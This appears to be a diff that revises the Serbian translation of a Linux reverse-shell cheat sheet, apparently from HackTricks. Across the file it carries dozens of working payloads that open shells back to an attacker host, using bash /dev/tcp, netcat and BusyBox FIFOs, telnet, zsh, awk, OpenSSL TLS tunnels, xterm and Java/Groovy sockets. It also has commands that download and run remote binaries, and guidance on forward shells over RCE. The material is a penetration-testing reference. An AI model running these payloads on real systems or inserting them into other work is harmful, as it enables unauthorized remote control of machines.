@@ -1,12 +1,14 @@
-# Shells - Linux
+# Shell-ovi - Linux
 
-**Ako imate pitanja u vezi sa bilo kojim od ovih shellova, možete ih proveriti na** [**https://explainshell.com/**](https://explainshell.com/).<sup>[[9]](#references)</sup>
+{{#include ../../banners/hacktricks-training.md}}
+
+**Ako imate pitanja u vezi sa bilo kojim od ovih shell-ova, možete ih proveriti na** [**https://explainshell.com/**](https://explainshell.com/).<sup>[[9]](#references)</sup>
 
 ## Full TTY
 
-**Kada dobijete reverse shell**[ **pročitajte ovu stranicu da biste dobili puni TTY**](full-ttys.md)**.**
+**Kada dobijete reverse shell**[ **pročitajte ovu stranicu da biste dobili full TTY**](full-ttys.md)**.**
 
-Osnovni reverse-shell payloads prikupljeni u nastavku takođe su dokumentovani u HighOn.Coffee i PayloadsAllTheThings cheat sheetovima; proverite da li su interpreter i utility dostupni na targetu pre nego što izaberete neki.<sup>[[1]](#references)[[4]](#references)</sup>
+Osnovni reverse-shell payload-i prikupljeni u nastavku takođe su dokumentovani u cheat sheet-ovima HighOn.Coffee i PayloadsAllTheThings; proverite dostupnost interpreter-a i utility-ja na targetu pre nego što izaberete jedan od njih.<sup>[[1]](#references)[[4]](#references)</sup>
 
 ## Bash | sh
 ```bash
@@ -34,26 +36,26 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 ```
 #### Objašnjenje Shell-a
 
-Sledeće tačke sažimaju dokumentovano interaktivno ponašanje i ponašanje pri redirekciji u Bash-u:<sup>[[10]](#references)[[11]](#references)</sup>
+Sledeće tačke sumiraju dokumentovano interaktivno ponašanje i ponašanje pri preusmeravanju u Bash-u:<sup>[[10]](#references)[[11]](#references)</sup>
 
 1. **`bash -i`**: Ovaj deo komande pokreće interaktivni (`-i`) Bash shell.
-2. **`>&`**: Ovaj deo komande predstavlja skraćenu notaciju za **preusmeravanje standardnog izlaza** (`stdout`) i **standardne greške** (`stderr`) na **isto odredište**.
-3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Ovo je posebna datoteka koja **predstavlja TCP konekciju ka navedenoj IP adresi i portu**.
-- **Preusmeravanjem izlaznih i error stream-ova u ovu datoteku**, komanda efektivno šalje izlaz interaktivne shell sesije na mašinu attackera.
+2. **`>&`**: Ovaj deo komande je skraćena notacija za **preusmeravanje standardnog izlaza** (`stdout`) i **standardne greške** (`stderr`) na **isto odredište**.
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Ovo je posebna datoteka koja **predstavlja TCP vezu ka navedenoj IP adresi i portu**.
+- **Preusmeravanjem izlaznih i error stream-ova u ovu datoteku**, komanda efektivno šalje izlaz interaktivne shell sesije na napadačev računar.
 4. **`0>&1`**: Ovaj deo komande **preusmerava standardni ulaz (`stdin`) na isto odredište kao standardni izlaz (`stdout`)**.
 
-### Kreiranje u fajlu i izvršavanje
+### Kreiranje u datoteci i izvršavanje
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
 ## Forward Shell
 
-Kada je RCE dostupan, ali je reverse shell blokiran firewall-om, NAT-om ili outbound filtering-om, forward shell preko RCE kanala može da obezbedi polu-interaktivnu sesiju.<sup>[[12]](#references)</sup>
+Kada je RCE dostupan, ali je reverse shell blokiran firewall-om, NAT-om ili outbound filtering-om, forward shell preko RCE kanala može obezbediti semi-interaktivnu sesiju.<sup>[[12]](#references)</sup>
 
-Preporučeni alat za ovu svrhu je [toboggan](https://github.com/n3rada/toboggan.git), koji primitiv za izvršavanje komandi obavija u interaktivnu sesiju.<sup>[[12]](#references)</sup>
+Preporučeni tool za ovu svrhu je [toboggan](https://github.com/n3rada/toboggan.git), koji command-execution primitive obavija interaktivnom sesijom.<sup>[[12]](#references)</sup>
 
-Da biste koristili toboggan, kreirajte Python modul prilagođen RCE kontekstu ciljnog sistema; interfejs njegovog modula očekuje funkciju `execute(command, timeout)` koja vraća izlaz komande.<sup>[[12]](#references)</sup> Na primer, modul pod nazivom `nix.py` može biti strukturisan na sledeći način:
+Da biste koristili toboggan, kreirajte Python module prilagođen RCE kontekstu ciljnog sistema; njegov module interface očekuje funkciju `execute(command, timeout)` koja vraća output komande.<sup>[[12]](#references)</sup> Na primer, module pod nazivom `nix.py` mogao bi biti strukturiran na sledeći način:
 ```python3
 import jwt
 import httpx
@@ -77,21 +79,21 @@ response.raise_for_status()
 
 return response.text
 ```
-Pokrenite modul koristeći trenutni oblik toboggan komandne linije:<sup>[[12]](#references)</sup>
+Pokrenite modul koristeći trenutni oblik komandne linije alata toboggan:<sup>[[12]](#references)</sup>
 ```shell
 toboggan nix.py
 ```
-Ovo pokreće interaktivnu sesiju. Za ugrađeni Burp Suite backend koristite `toboggan --request burp_request.xml`; za backend sa command-wrapper funkcijom koristite `toboggan --exec-wrapper '<command_template>'`.<sup>[[12]](#references)</sup>
+Ovo pokreće interaktivnu sesiju. Za ugrađeni Burp Suite backend, koristite `toboggan --request burp_request.xml`; za command-wrapper backend, koristite `toboggan --exec-wrapper '<command_template>'`.<sup>[[12]](#references)</sup>
 
-Druga mogućnost je implementacija `IppSec` forward-shell [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).<sup>[[13]](#references)</sup>
+Druga mogućnost je `IppSec` forward-shell implementacija [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).<sup>[[13]](#references)</sup>
 
 Potrebno je da izmenite sledeće delove:<sup>[[13]](#references)</sup>
 
 - URL ranjivog hosta
-- Prefiks i sufiks vašeg payload-a (ako postoje)
-- Način slanja payload-a (headers? data? dodatne informacije?)
+- prefix i suffix vašeg payload-a (ako postoje)
+- način na koji se payload šalje (headers? data? dodatne informacije?)
 
-Zatim možete **slati komande** ili koristiti komandu **`upgrade`** da biste dobili punu PTY sesiju; implementacija proverava izlaz u približnom intervalu od 1,3 sekunde.<sup>[[13]](#references)</sup>
+Zatim možete **slati komande** ili koristiti **`upgrade` komandu** da biste dobili puni PTY; implementacija proverava izlaz u približnom intervalu od 1,3 sekunde.<sup>[[13]](#references)</sup>
 
 ## Netcat
 ```bash
@@ -103,19 +105,19 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 ```
 ## BusyBox
 
-BusyBox objedinjuje mnoge uslužne programe u jednu malu izvršnu datoteku i čest je na malim ili ugrađenim Linux sistemima. Ako ne postoji samostalni `nc`, proverite da li ga BusyBox izlaže:<sup>[[8]](#references)[[19]](#references)</sup>
+BusyBox objedinjuje mnoge alatke u jednu malu izvršnu datoteku i čest je na malim ili ugrađenim Linux sistemima. Ako ne postoji samostalni `nc`, proverite da li ga BusyBox izlaže:<sup>[[8]](#references)[[19]](#references)</sup>
 ```bash
 busybox --list-full | grep -E '(^|/)nc$'
 busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
 busybox nc <ATTACKER-IP> <PORT> -e sh
 ```
-Ako `busybox nc` postoji, ali je interaktivno izvršavanje nepouzdano, prilagodite FIFO obrazac iz odeljka `nc` tom applet-u:<sup>[[2]](#references)[[8]](#references)</sup>
+Ako `busybox nc` postoji, ali je interaktivno izvršavanje nepouzdano, prilagodite FIFO obrazac iz odeljka `nc` tom appletu:<sup>[[2]](#references)[[8]](#references)</sup>
 ```bash
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
 ```
 ## gsocket
 
-Proverite zvanična uputstva za deployment na [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/).<sup>[[14]](#references)</sup>
+Pogledajte zvanična uputstva za deployment na [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/).<sup>[[14]](#references)</sup>
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
@@ -132,7 +134,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```bash
 while true; do nc -l <port>; done
 ```
-Koristite isti redosled unosa Enter/CTRL+D opisan u odeljku Whois.<sup>[[3]](#references)</sup>
+Koristite istu sekvencu unosa Enter/CTRL+D opisanu u odeljku Whois.<sup>[[3]](#references)</sup>
 
 **Žrtva**
 ```bash
@@ -240,7 +242,7 @@ zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPL
 ```
 ## Rustcat (rcat)
 
-[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – moderan netcat-like listener napisan u Rust-u.<sup>[[5]](#references)</sup>
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – moderni netcat-like listener napisan u Rust-u.<sup>[[5]](#references)</sup>
 ```bash
 # Attacker – interactive listener with history & tab-completion
 rcat listen -ib 55600
@@ -250,8 +252,8 @@ curl -L https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-l
 && chmod +x /tmp/rcat \
 && /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
 ```
-Funkcije koje su dokumentovane u projektu uključuju:<sup>[[5]](#references)</sup>
-- Istoriju komandi i dopunjavanje tabulatorom u interaktivnom režimu
+Funkcije koje projekat dokumentuje uključuju:<sup>[[5]](#references)</sup>
+- Istoriju komandi i dopunjavanje pomoću tastera Tab u interaktivnom režimu
 - `-s` za izbor shell izvršne datoteke koju koristi `connect`
 
 ## pwncat-cs
@@ -265,11 +267,11 @@ pwncat-cs -lp 4444
 # Victim - reuse any payload from this page
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
 ```
-Takođe podržava **šifrovane** `ssl-bind` i `ssl-connect` kanale, tako da ga možete upariti sa `ncat --ssl` ili `socat OPENSSL:` payloadima kada vam je potrebno šifrovanje transporta.<sup>[[7]](#references)</sup>
+Podržava i **šifrovane** `ssl-bind` i `ssl-connect` kanale, pa ga možete upariti sa `ncat --ssl` ili `socat OPENSSL:` payloadima kada vam je potrebna transportna enkripcija.<sup>[[7]](#references)</sup>
 
 ## revsh (šifrovan i spreman za pivoting)
 
-`revsh` je mali C klijent/server koji obezbeđuje puni TTY preko **šifrovanog Diffie-Hellman tunela** i opciono može da poveže **TUN/TAP** interfejs za reverse VPN-like pivoting.<sup>[[6]](#references)</sup>
+`revsh` je mali C klijent/server koji pruža pun TTY preko **šifrovanog Diffie-Hellman tunela** i po izboru može da poveže **TUN/TAP** interfejs za reverse VPN-like pivoting.<sup>[[6]](#references)</sup>
 ```bash
 # Build after preparing the OpenSSL dependency as described in the repository README
 git clone https://github.com/emptymonkey/revsh && cd revsh && make
@@ -280,16 +282,16 @@ revsh -c 0.0.0.0:443
 # Victim – reverse shell over the encrypted tunnel
 ./revsh <ATTACKER-IP>:443
 ```
-Korisne opcije dokumentovane za `revsh` uključuju:<sup>[[6]](#references)</sup>
-- `-b`: bind-shell režim (omogućite ga na oba kraja)
-- `-D [LHOST:]LPORT` ili `-B [RHOST:]RPORT`: dinamičko SOCKS 4/4a/5 prosleđivanje
+Korisne zastavice dokumentovane za `revsh` uključuju:<sup>[[6]](#references)</sup>
+- `-b`: bind-shell mode (omogućite ga na oba kraja)
+- `-D [LHOST:]LPORT` ili `-B [RHOST:]RPORT`: dynamic SOCKS 4/4a/5 forwarding
 - `-x`: onemogućava automatsko podešavanje proxy-ja, uključujući podrazumevano TUN/TAP podešavanje
 
-Šifrovani tunel sprečava izlaganje shell saobraćaja u obliku nešifrovanog teksta, ali sam po sebi ne zaobilazi mrežnu politiku.<sup>[[6]](#references)</sup>
+Encrypted tunnel sprečava izlaganje shell saobraćaja kao plaintext, ali sam po sebi ne zaobilazi network policy.<sup>[[6]](#references)</sup>
 
 ## OpenSSL
 
-Ovaj odeljak koristi OpenSSL komande `req`, `s_server` i `s_client` za kreiranje sertifikata i prenos shell-a preko TLS-a.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>
+Ovaj odeljak koristi OpenSSL komande `req`, `s_server` i `s_client` za kreiranje certificate-a i prenos shell-a preko TLS-a.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>
 
 Napadač (Kali)
 ```bash
@@ -304,7 +306,7 @@ mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATT
 #If the target needs SNI / hostname validation to blend with a fronted TLS service
 mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
 ```
-I dalje možete koristiti klasičan obrazac **two-listener** kada želite odvojene kanale za ulaz/izlaz.<sup>[[16]](#references)[[17]](#references)</sup>
+I dalje možete koristiti klasični **two-listener** obrazac kada želite odvojene kanale za ulaz/izlaz.<sup>[[16]](#references)[[17]](#references)</sup>
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -336,7 +338,7 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```bash
 while true; do nc -l 79; done
 ```
-Da biste poslali komandu, napišite je, pritisnite Enter, a zatim CTRL+D (da zaustavite STDIN).<sup>[[3]](#references)</sup>
+Da biste poslali komandu, unesite je, pritisnite Enter, a zatim pritisnite CTRL+D (da zaustavite STDIN).<sup>[[3]](#references)</sup>
 
 **Žrtva**
 ```bash
@@ -373,7 +375,7 @@ Ovo će pokušati da se poveže sa vašim sistemom na portu 6001.<sup>[[2]](#ref
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Za prihvatanje reverse shell-a koristite X server koji osluškuje port 6001, kao što je prikazano u nastavku.<sup>[[2]](#references)</sup>
+Da biste presreli reverse shell, koristite X server koji osluškuje port 6001, kao što je prikazano u nastavku.<sup>[[2]](#references)</sup>
 ```bash
 # Authorize host
 xhost +targetip
@@ -382,7 +384,7 @@ Xnest :1
 ```
 ## Groovy
 
-autora [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76). NAPOMENA: Java reverse shell takođe radi za Groovy.<sup>[[18]](#references)</sup>
+autor [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76). NAPOMENA: Java reverse shell takođe radi u Groovy-ju.<sup>[[18]](#references)</sup>
 ```bash
 String host="localhost";
 int port=8044;
@@ -391,23 +393,23 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ```
 ## References
 
-- [1] [Reverse Shell Cheat Sheet: PHP, ASP, Netcat, Bash & Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
-- [2] [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+- [1] [Cheat Sheet za Reverse Shell: PHP, ASP, Netcat, Bash i Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+- [2] [Cheat Sheet za Reverse Shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 - [3] [Korišćenje Whois i Finger za Reverse Shell-ove](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
-- [4] [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-- [5] [rustcat - Moderan port listener i reverse shell](https://github.com/robiot/rustcat)
-- [6] [revsh - Reverse shell sa podrškom za terminal, data tunneling-om i naprednim pivoting mogućnostima](https://github.com/emptymonkey/revsh)
+- [4] [PayloadsAllTheThings - Cheat Sheet za Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [5] [rustcat - moderni port listener i reverse shell](https://github.com/robiot/rustcat)
+- [6] [revsh - Reverse shell sa podrškom za terminal, tunelovanjem podataka i naprednim mogućnostima pivoting-a](https://github.com/emptymonkey/revsh)
 - [7] [pwncat (pwncat-cs) - platforma za post-exploitation](https://github.com/calebstewart/pwncat)
 - [8] [busybox | GTFOBins](https://gtfobins.org/gtfobins/busybox/)
 - [9] [explainshell.com](https://explainshell.com/)
 - [10] [Bash Reference Manual: Preusmeravanja](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
-- [11] [Bash Reference Manual: Pokretanje Bash-a](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
+- [11] [Bash Reference Manual: Pozivanje Bash-a](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
 - [12] [toboggan](https://github.com/n3rada/toboggan)
 - [13] [forward-shell](https://github.com/IppSec/forward-shell)
 - [14] [Uputstva za deployment Global Socket-a](https://www.gsocket.io/deploy/)
 - [15] [openssl-req](https://docs.openssl.org/4.0/man1/openssl-req/)
 - [16] [openssl-s_server](https://docs.openssl.org/master/man1/openssl-s_server/)
 - [17] [openssl-s_client](https://docs.openssl.org/master/man1/openssl-s_client/)
-- [18] [Čisti Groovy/Java Reverse Shell](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
+- [18] [Pure Groovy/Java Reverse Shell](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
 - [19] [BusyBox](https://busybox.net/about.html)
 {{#include ../../banners/hacktricks-training.md}}
